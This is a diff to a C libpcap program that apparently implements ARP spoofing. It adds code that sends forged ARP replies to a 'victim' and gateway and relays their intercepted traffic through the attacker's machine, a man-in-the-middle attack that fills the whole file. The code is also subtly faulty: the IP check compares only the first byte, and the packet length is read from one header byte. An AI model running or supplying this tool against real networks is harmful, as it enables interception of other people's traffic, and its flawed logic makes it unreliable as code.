@@ -105,6 +105,17 @@ void parseIP(uint8_t *result, char* source){
 	}
 	result[temp] = integer;
 }
+
+
+bool check_ip(uint8_t * ip,const u_char* check){
+
+	for(int i=0;i<4;i++){
+		if(ip[i]!=check[i+28]) return false;
+		else return true;
+	}
+
+}
+
 int main(int argc, char* argv[])
 {
 	uint8_t dest_mac[6];
@@ -139,41 +150,83 @@ int main(int argc, char* argv[])
 		target_mac[i] = 0x00;
 	}
 	if(make_and_send_packet(handle,dest_mac,my_mac,my_ip,sender_ip,target_mac,0x0001) !=0){
-		printf("send broadcast request packet failed!\n");	
+	printf("send broadcast request packet failed!\n");	
 	}else{
 		printf("send broadcast request packet success!!\n");
 	};
 	
 	/*take target's mac address*/
 	while(true){
-		printf("sniff....\n");
+		printf("\nsniff....\n");
 		struct pcap_pkthdr* header;
 		const u_char* packet;
+		u_char* dummy;
 		int res = pcap_next_ex(handle, &header,&packet);
-		for(int i=0;i<42;i++){
-			dest_mac[i] = packet[i];
-			printf("%02x ",packet[i]);
-		}
-		printf("\n");
 		if( res==0) continue;
-		if (res== -1||res==-2)break;;
+		if (res== -1||res==-2)break;
 		uint8_t type[2]; 
 		uint8_t opcode[2];
+		unsigned int packet_len = (unsigned int)packet[17]+14;
 		type[0] = packet[12];
 		type[1] = packet[13];
 		opcode[0]=packet[20];
 		opcode[1]=packet[21];
-
+		/*print some packet data in received packet*/
+		printf("%d\n",packet_len);
+		for(int i =0;i<packet_len;i++){
+			printf("%02x ",packet[i]);
+			if(i%8==7)printf("\n");
+		}
+		
 		if(type[0]==0x08 &&type[1]==0x06){ //is type == arp ?
 			if(opcode[0]==0x00 &&opcode[1]==0x02){//is opcode is reply?
-				break;
+				if(check_ip(sender_ip,packet)){//is victim's recovery?
+					/*send reply to victim*/
+					if(make_and_send_packet(handle,sender_mac,my_mac,target_ip,sender_ip,target_mac,0x0002)!=0){
+						printf("\nsend arp reply packet to victim failed!\n");
+					}else{
+						printf("\nsend arp reply packet to victim success!\n");
+					}	
+				}else if(check_ip(target_ip,packet)){//is gateway's recovery?
+					if(make_and_send_packet(handle,sender_mac,my_mac,target_ip,sender_ip,target_mac,0x0002)!=0){
+						printf("\nsend arp reply packet to victim failed!\n");
+					}else{
+						printf("\nsend arp reply packet to victim success!\n");
+					}
+
+				}	
 			}
+		}else{ //relay 
+			dummy=(u_char*)packet; //copy packet to dummy(non constant variable)
+			if(check_ip(sender_ip,packet)){ //if victim's packet
+				printf("relay victim's packet!!\n");
+				for(int i=0;i<6;i++){
+					dummy[i+6]=my_mac[i];
+				}
+				for(int i=0;i<packet_len;i++){ //print packet
+					printf("%02x ",packet[i]);
+					if(i%8==7){
+						printf("\n");
+					}
+				}
+				pcap_sendpacket(handle,dummy,packet_len);
+
+			}else if(check_ip(target_ip,packet)){//if gateway's packet
+				printf("relay gateway's packet!!\n");
+				for(int i=0;i<6;i++){
+					dummy[i+6]=my_mac[i];
+				}
+				for(int i=0;i<packet_len;i++){
+					printf("%02x ",packet[i]);
+					if(i%8==7){
+						printf("\n");
+					}
+				}
+				pcap_sendpacket(handle,dummy,packet_len);
+			}
+
+	
 		}	
 	}
-	/*send reply to victim*/
-	if(make_and_send_packet(handle,sender_mac,my_mac,target_ip,sender_ip,target_mac,0x0002)!=0){
-	printf("send reply packet failed!\n");
-	}else{
-		printf("send reply packet success!\n");
-	}
+	
 }
